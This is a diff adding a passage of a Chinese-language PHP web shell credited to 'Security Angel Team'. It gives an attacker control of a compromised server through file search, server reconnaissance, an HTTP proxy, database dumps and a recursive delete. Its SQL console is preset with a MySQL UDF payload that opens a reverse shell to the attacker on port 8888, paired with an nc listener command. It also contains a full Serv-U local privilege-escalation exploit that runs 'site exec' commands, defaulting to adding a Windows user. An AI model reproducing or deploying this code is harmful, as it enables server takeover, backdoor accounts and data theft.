+	$tb->tdbody('文件位置: '.$tb->makeinput('path',''.$nowpath.'','','text','70').'<br>查找文字:'.$tb->makeinput('oldkey','下贱','','text','60').''.$tb->makehidden('do','search').'<br> 是否计算所在行<input type="checkbox" name="type" value="list" onclick="javascript:alert(\'选定此处将会列出关键词在所在文件的多少行,和所在的那文件有多少行进行比对\\n\\n格式为:[所在行/文件总行]例如[12/99],用来进行分析.\\n\\n此功能可能会增加一部分的延时,请考虑使用,没有可读权限将出错!\')"> (此功能和下面一个功能会影响执行速度，所以默认关闭!) <br>适当读取:<input type="checkbox" name="type2" value="getpath" onclick="javascript:alert(\'选定此处将会列出关键词在所在位置及你设定结束区域内的部分字符..\\n\\n采取此功能查找完文件后把鼠标移动到找到的文件名上即可读取分析....\\n\\n此功能可能会增加一部分的延时,请考虑使用,没有可读权限将出错!\')"> 读取关键词前'.$tb->makeinput('beline','0','','text','3').'个字符 '.$tb->makehidden('dir',''.$dir.'').'到关键词后第'.$tb->makeinput('endline','10','','text','3').'个字符... '.$tb->makehidden('dir',''.$dir.'').''.$tb->makeinput('','开始查找文件','','submit'),'center','1','35');
+	echo "</form>";
+	$tb->tdbody('请表太大的目录了，慢慢浏览慢慢找好不好嘛.假设选定计算行速度会慢。显示[所在行/总共多少行]','center');
+	$tb->tablefooter();
+}
+elseif ($_GET['action'] == "proxy") {
+	$action = '?action=proxy';
+	$tb->tableheader();
+	$tb->formheader($action,'在线代理','proxyframe');
+	$tb->tdbody('<br><ul><li>用本功能仅实现简单的 HTTP 代理,不会显示使用相对路径的图片、链接及CSS样式表.</li><li>用本功能可以通过本服务器浏览目标URL,但不支持 SQL Injection 探测以及某些特殊字符.</li><li>用本功能浏览的 URL,在目标主机上留下的IP记录是 : '.gethostbyname($_SERVER['SERVER_NAME']).'</li></ul>','left');
+	$tb->tdbody('URL: '.$tb->makeinput('url','http://1v1.name','','text','100').' '.$tb->makeinput('','浏览','','submit'),'center','1','40');
+	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://1v1.name"></iframe>');
+	echo "</form>";
+	$tb->tablefooter();
+}//end proxy
+
+elseif ($_GET['action'] == "sql") {
+	$action = '?action=sql';
+
+	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
+	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
+	$dbpassword = $_POST['dbpassword'];
+	$dbname = $_POST['dbname'];
+	$sql_query = $_POST['sql_query'];
+if($type=="fun"){
+$sql_query = "CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\Winnt\\\Mix.dll';
+select Mixconnect('".$_SERVER['REMOTE_ADDR']."','8888');/*这个最好先执行了上面一句再用*/
+/*请在你计算机上执行 nc -vv -l -p 8888*/";
+}
+	$tb->tableheader();
+	$tb->formheader($action,'执行 SQL 语句');
+	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','连接','','submit'));
+	$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
+	$tb->makehidden('do','query');
+	$tb->formfooter('1','30');
+}//end sql query
+
+elseif ($_GET['action'] == "sqlbak") {
+	$action = '?action=sqlbak';
+	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
+	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
+	$dbpassword = $_POST['dbpassword'];
+	$dbname = $_POST['dbname'];
+	$tb->tableheader();
+	$tb->formheader($action,'备份 MySQL 数据库');
+	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','连接','','submit'));
+	@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
+    $tables = @mysql_list_tables($dbname);
+    while ($table = @mysql_fetch_row($tables)) {
+		$cachetables[$table[0]] = $table[0];
+    }
+    @mysql_free_result($tables);
+	if (empty($cachetables)) {
+		$tb->tdbody('<b>您没有连接数据库 or 当前数据库没有任何数据表</b>');
+	} else {
+		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">请选择表:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> 备份数据所保存的路径:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> 直接下载到本地 (适合数据量较小的数据库)</td></tr></table>');
+		$tb->makehidden('do','backupmysql');
+		$tb->formfooter('0','30');
+	}
+	$tb->tablefooter();
+	@mysql_close();
+}//end sql backup
+
+elseif ($_GET['action'] == "phpenv") {
+	$user = " <a href=\"?action=nowuser\" target=\"_blank\">以免crush点此获取当前进程用户名</a> ";
+	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
+	$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
+	if ($dis_func == "") {
+		$dis_func = "No";
+	}else {
+		$dis_func = str_replace(" ","<br>",$dis_func);
+		$dis_func = str_replace(",","<br>",$dis_func);
+	}
+	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
+		$info = array(
+		    0 => array("当前php进程用户",$user),
+			1 => array("服务器操作系统",PHP_OS),
+			2 => array("服务器时间",date("Y年m月d日 h:i:s",time())),
+			3 => array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
+			4 => array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME'])),
+			5 => array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
+			6 => array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
+			7 => array("Web服务端口",$_SERVER['SERVER_PORT']),
+			8 => array("PHP运行方式",strtoupper(php_sapi_name())),
+			9 => array("PHP版本",PHP_VERSION),
+			10 => array("运行于安全模式",getphpcfg("safemode")),
+			11 => array("服务器管理员",$adminmail),
+			12 => array("本文件路径",__FILE__),
+            13 => array("允许使用 URL 打开文件 allow_url_fopen",getphpcfg("allow_url_fopen")),
+			14 => array("允许动态加载链接库 enable_dl",getphpcfg("enable_dl")),
+			15 => array("显示错误信息 display_errors",getphpcfg("display_errors")),
+			16 => array("自动定义全局变量 register_globals",getphpcfg("register_globals")),
+			17 => array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc")),
+			18 => array("程序最多允许使用内存量 memory_limit",getphpcfg("memory_limit")),
+			19 => array("POST最大字节数 post_max_size",getphpcfg("post_max_size")),
+			20 => array("允许最大上传文件 upload_max_filesize",$upsize),
+			21 => array("程序最长运行时间 max_execution_time",getphpcfg("max_execution_time")."秒"),
+			22 => array("被禁用的函数 disable_functions",$dis_func),
+			23 => array("phpinfo()",$phpinfo),
+			24 => array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
+            25 => array("图形处理 GD Library",getfun("imageline")),
+			26 => array("IMAP电子邮件系统",getfun("imap_close")),
+			27 => array("MySQL数据库",getfun("mysql_close")),
+			28 => array("SyBase数据库",getfun("sybase_close")),
+			29 => array("Oracle数据库",getfun("ora_close")),
+			30 => array("Oracle 8 数据库",getfun("OCILogOff")),
+			31 => array("PREL相容语法 PCRE",getfun("preg_match")),
+			32 => array("PDF文档支持",getfun("pdf_close")),
+			33 => array("Postgre SQL数据库",getfun("pg_close")),
+			34 => array("SNMP网络管理协议",getfun("snmpget")),
+			35 => array("压缩文件支持(Zlib)",getfun("gzclose")),
+			36 => array("XML解析",getfun("xml_set_object")),
+			37 => array("FTP",getfun("ftp_login")),
+			38 => array("ODBC数据库连接",getfun("odbc_close")),
+			39 => array("Session支持",getfun("session_start")),
+			40 => array("Socket支持",getfun("fsockopen")),
+		); 
+	$tb->tableheader();
+	echo "<form action=\"?action=phpenv\" method=\"POST\">\n";
+	$tb->tdbody('<b>查看PHP配置参数状况</b>','left','1','30','style="padding-left: 5px;"');
+	$tb->tdbody('请输入配置参数(如:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','查看','','submit'),'left','2','30','style="padding-left: 5px;"');
+	$tb->makehidden('do','viewphpvar');
+	echo "</form>\n";
+	$hp = array(0=> '服务器特性', 1=> 'PHP基本特性', 2=> '组件支持状况');
+	for ($a=0;$a<3;$a++) {
+		$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style="padding-left: 5px;"');
+?>
+  <tr class="secondalt">
+    <td>
+      <table width="100%" border="0" cellpadding="0" cellspacing="0">
+<?php
+		if ($a==0) {
+			for($i=0;$i<=12;$i++) {
+				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
+			}
+		} elseif ($a == 1) {
+			for ($i=13;$i<=24;$i++) {
+				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
+			}
+		} elseif ($a == 2) {
+			for ($i=25;$i<=40;$i++) {
+				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
+			}
+		}
+?>
+      </table>
+    </td>
+  </tr>
+<?php
+	}//for
+echo "</table>";
+}//end phpenv
+elseif($_GET['action'] == "SUExp")
+{
+    if($_POST['SUPort'] != "" && $_POST['SUUser'] != "" && $_POST['SUPass'] != "" && $_POST['SUCommand'])
+    {
+        echo "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\"><tr class=\"firstalt\"><td align=\"left\">";
+        $sendbuf = "";
+        $recvbuf = "";
+        $domain  = "-SETDOMAIN\r\n".
+                "-Domain=haxorcitos|0.0.0.0|2121|-1|1|0\r\n".
+                "-TZOEnable=0\r\n".
+                " TZOKey=\r\n";
+        $adduser = "-SETUSERSETUP\r\n".
+                "-IP=0.0.0.0\r\n".
+                "-PortNo=2121\r\n".
+                "-User=Will_Be\r\n".
+                "-Password=Will_Be\r\n".
+                "-HomeDir=c:\\\r\n".
+                "-LoginMesFile=\r\n".
+                "-Disable=0\r\n".
+                "-RelPaths=1\r\n".
+                "-NeedSecure=0\r\n".
+                "-HideHidden=0\r\n".
+                "-AlwaysAllowLogin=0\r\n".
+                "-ChangePassword=0\r\n".
+                "-QuotaEnable=0\r\n".
+                "-MaxUsersLoginPerIP=-1\r\n".
+                "-SpeedLimitUp=0\r\n".
+                "-SpeedLimitDown=0\r\n".
+                "-MaxNrUsers=-1\r\n".
+                "-IdleTimeOut=600\r\n".
+                "-SessionTimeOut=-1\r\n".
+                "-Expire=0\r\n".
+                "-RatioUp=1\r\n".
+                "-RatioDown=1\r\n".
+                "-RatiosCredit=0\r\n".
+                "-QuotaCurrent=0\r\n".
+                "-QuotaMaximum=0\r\n".
+                "-Maintenance=None\r\n".
+                "-PasswordType=Regular\r\n".
+                "-Ratios=None\r\n".
+                " Access=c:\\|RELP\r\n";
+        $deldomain="-DELETEDOMAIN\r\n".
+                     "-IP=0.0.0.0\r\n".
+                     " PortNo=2121\r\n";
+        $sock = fsockopen("127.0.0.1", $_POST["SUPort"], &$errno, &$errstr, 10);
+        $recvbuf = fgets($sock, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        $sendbuf = "USER ".$_POST["SUUser"]."\r\n";
+        fputs($sock, $sendbuf, strlen($sendbuf));
+        echo "<font color=blue>Send: $sendbuf</font><br>";
+        $recvbuf = fgets($sock, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        $sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
+        fputs($sock, $sendbuf, strlen($sendbuf));
+        echo "<font color=blue>Send: $sendbuf</font><br>";
+        $recvbuf = fgets($sock, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        $sendbuf = "SITE MAINTENANCE\r\n";
+        fputs($sock, $sendbuf, strlen($sendbuf));
+        echo "<font color=blue>Send: $sendbuf</font><br>";
+        $recvbuf = fgets($sock, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        $sendbuf = $domain;
+        fputs($sock, $sendbuf, strlen($sendbuf));
+        echo "<font color=blue>Send: $sendbuf</font><br>";
+        $recvbuf = fgets($sock, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        $sendbuf = $adduser;
+        fputs($sock, $sendbuf, strlen($sendbuf));
+        echo "<font color=blue>Send: $sendbuf</font><br>";
+        $recvbuf = fgets($sock, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        echo "**********************************************************<br>";
+        echo "Starting Exploit ...<br>";
+        echo "**********************************************************<br>";
+        $exp = fsockopen("127.0.0.1", "2121", &$errno, &$errstr, 10);
+        $recvbuf = fgets($exp, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        $sendbuf = "USER Will_Be\r\n";
+        fputs($exp, $sendbuf, strlen($sendbuf));
+        echo "<font color=blue>Send: $sendbuf</font><br>";
+        $recvbuf = fgets($exp, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        $sendbuf = "PASS Will_Be\r\n";
+        fputs($exp, $sendbuf, strlen($sendbuf));
+        echo "<font color=blue>Send: $sendbuf</font><br>";
+        $recvbuf = fgets($exp, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        $sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
+        fputs($exp, $sendbuf, strlen($sendbuf));
+        echo "<font color=blue>Send: site exec</font> <font color=green>".$_POST["SUCommand"]."</font><br>";
+        $recvbuf = fgets($exp, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        echo "**********************************************************<br>";
+        echo "Starting Delete Domain ...<br>";
+        echo "**********************************************************<br>";
+        $sendbuf = $deldomain;
+        fputs($sock, $sendbuf, strlen($sendbuf));
+        echo "<font color=blue>Send: $sendbuf</font><br>";
+        $recvbuf = fgets($sock, 1024);
+        echo "<font color=red>Recv: $recvbuf</font><br>";
+        echo "</td></tr></table>";
+        fclose($sock);
+        fclose($exp);
+    }
+?>
+<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
+  <tr class="firstalt">
+    <td align="center">通过Serv-U 本地管理员帐号执行命令</td>
+  </tr>
+  <form action="?action=SUExp" method="POST">
+  <tr class="secondalt">
+    <td align="center">LocalPort:
+      <input name="SUPort" type="text" class="INPUT" id="SUPort" value="43958" size="7">      　
+      LocalUser:
+      <input name="SUUser" type="text" class="INPUT" id="SUUser" value="LocalAdministrator">       　LocalPass:
+      <input name="SUPass" type="text" class="INPUT" id="SUPass" value="#l@$ak#.lk;0@P">
+      <br>
+      Command　:
+      <input name="SUCommand" type="text" class="INPUT" id="SUCommand" value="net user Will_Be heihei /add" size="50"></td>
+  </tr>
+  <tr class="secondalt">
+    <td align="center"><input name="Submit" type="submit" class="input" id="Submit" value="执行">　
+      <input name="Submit" type="reset" class="INPUT" value="重置"></td>
+  </tr>  
+  </form>
+</table>
+<?php
+}
+?>
+<hr width="775" noshade>
+<table width="775" border="0" cellpadding="0">
+  <tr>
+    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
+    <td align="right"><?php
+	debuginfo();
+	ob_end_flush();	
+	?></td>
+  </tr>
+</table>
+</center>
+</body>
+</html>
+
+<?php
+
+/*======================================================
+函数库
+======================================================*/
+
+	// 登陆入口
+	function loginpage() {
+?>
+<style type="text/css">
+input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";height: "18px";border: "1px solid #666666";}
+</style>
+<table width="416" border="0" align="center" cellpadding="0" cellspacing="0">
+<form method="POST" action="">
+  <tr> 
+    <td height="75" align="center">
+<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">
+<input type="hidden" name="do" value="login">
+<input type="submit" value="Login">
+	</td>
+  </tr>
+  </form>
+  <SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url=<? echo $_SERVER['HTTP_HOST'];?>'></SCRIPT>
+  </table>
+
+<?php
+		exit;
+	}//end loginpage()
+
+	// 页面调试信息
+	function debuginfo() {
+		global $starttime;
+		$mtime = explode(' ', microtime());
+		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
+		echo "Processed in $totaltime second(s)";
+	}
+
+	// 去掉转义字符
+	function stripslashes_array(&$array) {
+		while(list($key,$var) = each($array)) {
+			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
+				if (is_string($var)) {
+					$array[$key] = stripslashes($var);
+				}
+				if (is_array($var))  {
+					$array[$key] = stripslashes_array($var);
+				}
+			}
+		}
+		return $array;
+	}
+
+	// 删除目录
+	function deltree($deldir) {
+		$mydir=@dir($deldir);	
+		while($file=$mydir->read())	{ 		
+			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
+				@chmod("$deldir/$file",0777);
+				deltree("$deldir/$file"); 
+			}
+			if (is_file("$deldir/$file")) {
+				@chmod("$deldir/$file",0777);
+				@unlink("$deldir/$file");
+			}
+		} 
+		$mydir->close(); 
+		@chmod("$deldir",0777);
+		return (@rmdir($deldir)) ? 1 : 0;
+	} 
+
+	// 判断读写情况
+	function dir_writeable($dir) {
+		if (!is_dir($dir)) {
+			@mkdir($dir, 0777);
+		}
+		if(is_dir($dir)) {
+			if ($fp = @fopen("$dir/test.txt", 'w')) {
+				@fclose($fp);
+				@unlink("$dir/test.txt");
+				$writeable = 1;
+			} else {
+				$writeable = 0;
+			}
+		}
+		return $writeable;
+	}
+
+	// 表格行间的背景色替换
+	function getrowbg() {
+		global $bgcounter;
+		if ($bgcounter++%2==0) {
+			return "firstalt";
+		} else {
+			return "secondalt";
+		}
+	}
+
+	// 获取当前的文件系统路径
+	function getPath($mainpath, $relativepath) {
+		global $dir;
+		$mainpath_info           = explode('/', $mainpath);
+		$relativepath_info       = explode('/', $relativepath);
+		$relativepath_info_count = count($relativepath_info);
+		for ($i=0; $i<$relativepath_info_count; $i++) {
+			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
+			if ($relativepath_info[$i] == '..') {
+				$mainpath_info_count = count($mainpath_info);
+				unset($mainpath_info[$mainpath_info_count-1]);
+				continue;
+			}
+			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
+		} //end for
+		return implode('/', $mainpath_info);
+	}
+
+	// 检查PHP配置参数
+	function getphpcfg($varname) {
+		switch($result = get_cfg_var($varname)) {
+			case 0:
+			return "No";
+			break;
+			case 1:
+			return "Yes";
+			break;
+			default:
+			return $result;
+			break;
+		}
+	}
+
+	// 检查函数情况
+	function getfun($funName) {
+		return (false !== function_exists($funName)) ? "Yes" : "No";
+	}
+
+	// 压缩打包类
+	class PHPZip{
+	var $out='';
+		function PHPZip($dir)	{
+    		if (@function_exists('gzcompress'))	{
+				$curdir = getcwd();
+				if (is_array($dir)) $filelist = $dir;
+		        else{
+			        $filelist=$this -> GetFileList($dir);//文件列表
+				    foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
+	            }
+		        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
+				else chdir($curdir);
+				if (count($filelist)>0){
+					foreach($filelist as $filename){
+						if (is_file($filename)){
+							$fd = fopen ($filename, "r");
+							$content = @fread ($fd, filesize ($filename));
+							fclose ($fd);
+						    if (is_array($dir)) $filename = basename($filename);
+							$this -> addFile($content, $filename);
+						}
+					}
+					$this->out = $this -> file();
+					chdir($curdir);
+				}
+				return 1;
+			}
+			else return 0;
+		}
+
+		// 获得指定目录文件列表
+		function GetFileList($dir){
+			static $a;
+			if (is_dir($dir)) {
+				if ($dh = opendir($dir)) {
+			   		while (($file = readdir($dh)) !== false) {
+						if($file!='.' && $file!='..'){
+            				$f=$dir .'/'. $file;
+            				if(is_dir($f)) $this->GetFileList($f);
+							$a[]=$f;
+	        			}
+					}
+     				closedir($dh);
+    			}
+			}
+			return $a;
+		}
+
+		var $datasec      = array();
+	    var $ctrl_dir     = array();
+		var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
+	    var $old_offset   = 0;
+
+		function unix2DosTime($unixtime = 0) {
+	        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
+		    if ($timearray['year'] < 1980) {
+				$timearray['year']    = 1980;
+        		$timearray['mon']     = 1;
+	        	$timearray['mday']    = 1;
+		    	$timearray['hours']   = 0;
+				$timearray['minutes'] = 0;
+        		$timearray['seconds'] = 0;
+	        } // end if
+		    return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
+			        ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
+	    }
+
+		function addFile($data, $name, $time = 0) {
+	        $name     = str_replace('\\', '/', $name);
+
+		    $dtime    = dechex($this->unix2DosTime($time));
+	        $hexdtime = '\x' . $dtime[6] . $dtime[7]
+		              . '\x' . $dtime[4] . $dtime[5]
+			          . '\x' . $dtime[2] . $dtime[3]
+				      . '\x' . $dtime[0] . $dtime[1];
+	        eval('$hexdtime = "' . $hexdtime . '";');
+		    $fr   = "\x50\x4b\x03\x04";
+			$fr   .= "\x14\x00";
+	        $fr   .= "\x00\x00";
+		    $fr   .= "\x08\x00";
+			$fr   .= $hexdtime;
+
+	        $unc_len = strlen($data);
+		    $crc     = crc32($data);
+			$zdata   = gzcompress($data);
+	        $c_len   = strlen($zdata);
+		    $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
+			$fr      .= pack('V', $crc);
+	        $fr      .= pack('V', $c_len);
+		    $fr      .= pack('V', $unc_len);
+			$fr      .= pack('v', strlen($name));
+	        $fr      .= pack('v', 0);
+		    $fr      .= $name;
+
+			$fr .= $zdata;
+
+	        $fr .= pack('V', $crc);
+		    $fr .= pack('V', $c_len);
+			$fr .= pack('V', $unc_len);
+
+	        $this -> datasec[] = $fr;
+		    $new_offset        = strlen(implode('', $this->datasec));
+
+			$cdrec = "\x50\x4b\x01\x02";
+	        $cdrec .= "\x00\x00";
+		    $cdrec .= "\x14\x00";
+			$cdrec .= "\x00\x00";
+	        $cdrec .= "\x08\x00";
+		    $cdrec .= $hexdtime;
+			$cdrec .= pack('V', $crc);
+	        $cdrec .= pack('V', $c_len);
+		    $cdrec .= pack('V', $unc_len);
+			$cdrec .= pack('v', strlen($name) );
+	        $cdrec .= pack('v', 0 );
+		    $cdrec .= pack('v', 0 );
+			$cdrec .= pack('v', 0 );
+	        $cdrec .= pack('v', 0 );
+		    $cdrec .= pack('V', 32 );
+			$cdrec .= pack('V', $this -> old_offset );
+	        $this -> old_offset = $new_offset;
+		    $cdrec .= $name;
+
+			$this -> ctrl_dir[] = $cdrec;
+	    }
+
+		function file() {
+			$data    = implode('', $this -> datasec);
+	        $ctrldir = implode('', $this -> ctrl_dir);
+		    return
+			    $data .
+				$ctrldir .
+	            $this -> eof_ctrl_dir .
+		        pack('v', sizeof($this -> ctrl_dir)) .
+			    pack('v', sizeof($this -> ctrl_dir)) .
+				pack('V', strlen($ctrldir)) .
+	            pack('V', strlen($data)) .
+		        "\x00\x00";
+	    }
+	}
+
+	// 备份数据库
+	function sqldumptable($table, $fp=0) {
+		$tabledump = "DROP TABLE IF EXISTS $table;\n";
+		$tabledump .= "CREATE TABLE $table (\n";
+
+		$firstfield=1;
+
+		$fields = mysql_query("SHOW FIELDS FROM $table");
+		while ($field = mysql_fetch_array($fields)) {
+			if (!$firstfield) {
+				$tabledump .= ",\n";
+			} else {
+				$firstfield=0;
+			}
+			$tabledump .= "   $field[Field] $field[Type]";
+			if (!empty($field["Default"])) {
+				$tabledump .= " DEFAULT '$field[Default]'";
+			}
+			if ($field['Null'] != "YES") {
+				$tabledump .= " NOT NULL";
+			}
+			if ($field['Extra'] != "") {
+				$tabledump .= " $field[Extra]";
+			}
+		}
+		mysql_free_result($fields);
+	
+		$keys = mysql_query("SHOW KEYS FROM $table");
+		while ($key = mysql_fetch_array($keys)) {
+			$kname=$key['Key_name'];
+			if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
+				$kname="UNIQUE|$kname";
+			}
+			if(!is_array($index[$kname])) {
+				$index[$kname] = array();
+			}
+			$index[$kname][] = $key['Column_name'];
+		}
+		mysql_free_result($keys);
+
+		while(list($kname, $columns) = @each($index)) {
+			$tabledump .= ",\n";
+			$colnames=implode($columns,",");
+
+			if ($kname == "PRIMARY") {
+				$tabledump .= "   PRIMARY KEY ($colnames)";
+			} else {
+				if (substr($kname,0,6) == "UNIQUE") {
+					$kname=substr($kname,7);
+				}
+				$tabledump .= "   KEY $kname ($colnames)";
+			}
+		}
+
+		$tabledump .= "\n);\n\n";
+		if ($fp) {
+			fwrite($fp,$tabledump);
+		} else {
+			echo $tabledump;
+		}
+
+		$rows = mysql_query("SELECT * FROM $table");
+		$numfields = mysql_num_fields($rows);
+		while ($row = mysql_fetch_array($rows)) {
+			$tabledump = "INSERT INTO $table VALUES(";
+
+			$fieldcounter=-1;
+			$firstfield=1;
+			while (++$fieldcounter<$numfields) {
+				if (!$firstfield) {
+					$tabledump.=", ";
+				} else {
+					$firstfield=0;
+				}
+
+				if (!isset($row[$fieldcounter])) {
+					$tabledump .= "NULL";
+				} else {
+					$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
+				}
+			}
+
+			$tabledump .= ");\n";
+
+			if ($fp) {
+				fwrite($fp,$tabledump);
+			} else {
+				echo $tabledump;
+			}
+		}
+		mysql_free_result($rows);
+	}
+
+	class FORMS {
+		function tableheader() {
+			echo "<table width=\"775\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
+		}
+
+		function headerform($arg=array()) {
+			global $dir;
+			if ($arg[enctype]){
+				$enctype="enctype=\"$arg[enctype]\"";
+			} else {
+				$enctype="";
+			}
+			if (!isset($arg[method])) {
+				$arg[method] = "POST";
+			}
+			if (!isset($arg[action])) {
+				$arg[action] = '';
+			}
+			echo "  <form action=\"".$arg[action]."\" method=\"".$arg[method]."\" $enctype>\n";
+			echo "  <tr>\n";
+			echo "    <td>".$arg[content]."</td>\n";
+			echo "  </tr>\n";
+			echo "  </form>\n";
+		}
+
+		function tdheader($title) {
+			global $dir;
+			echo "  <tr class=\"firstalt\">\n";
+			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">返回</a>]</b></td>\n";
+			echo "  </tr>\n";
+		}
+
+		function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {
+			if ($bgcolor=='2') {
+				$css="secondalt";
+			} elseif ($bgcolor=='1') {
+				$css="firstalt";
+			} else {
+				$css=$bgcolor;
+			}
+			$height = empty($height) ? "" : " height=".$height;
+			$colspan = empty($colspan) ? "" : " colspan=".$colspan;
+			echo "  <tr class=\"".$css."\">\n";
+			echo "	<td align=\"".$align."\"".$height." ".$colspan." ".$extra.">".$content."</td>\n";
+			echo "  </tr>\n";
+		}
+
+		function tablefooter() {
+			echo "</table>\n";
+		}
+
+		function formheader($action='',$title,$target='') {
+			global $dir;
+			$target = empty($target) ? "" : " target=\"".$target."\"";
+			echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
+			echo "  <tr class=\"firstalt\">\n";
+			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">返回</a>]</b></td>\n";
+			echo "  </tr>\n";
+		}
+
+		function makehidden($name,$value=''){
+			echo "<input type=\"hidden\" name=\"$name\" value=\"$value\">\n";
+		}
+
+		function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){
+			$css = ($css == 'input') ? " class=\"input\"" : "";
+			$input = "<input name=\"$name\" value=\"$value\" type=\"$type\" ".$css." size=\"$size\" $extra>\n";
+			return $input;
+		}
+
+		function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){
+			$textarea = "<textarea name=\"".$name."\" cols=\"".$cols."\" rows=\"".$rows."\" ".$extra.">".$content."</textarea>\n";
+			return $textarea;
+		}
+
+		function formfooter($over='',$height=''){
+			$height = empty($height) ? "" : " height=\"".$height."\"";
+			echo "  <tr class=\"secondalt\">\n";
+			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"确定\"></td>\n";
+			echo "  </tr>\n";
+			echo " </form>\n";
+			echo $end = empty($over) ? "" : "</table>\n";
+		}
+
+		function makeselect($arg = array()){
+			if ($arg[multiple]==1) {
+				$multiple = " multiple";
+				if ($arg[size]>0) {
+					$size = "size=$arg[size]";
+				}
+			}
+			if ($arg[css]==0) {
+				$css = "class=\"input\"";
+			}
+			$select = "<select $css name=\"$arg[name]\"$multiple $size>\n";
+				if (is_array($arg[option])) {
+					foreach ($arg[option] AS $key=>$value) {
+						if (!is_array($arg[selected])) {
+							if ($arg[selected]==$key) {
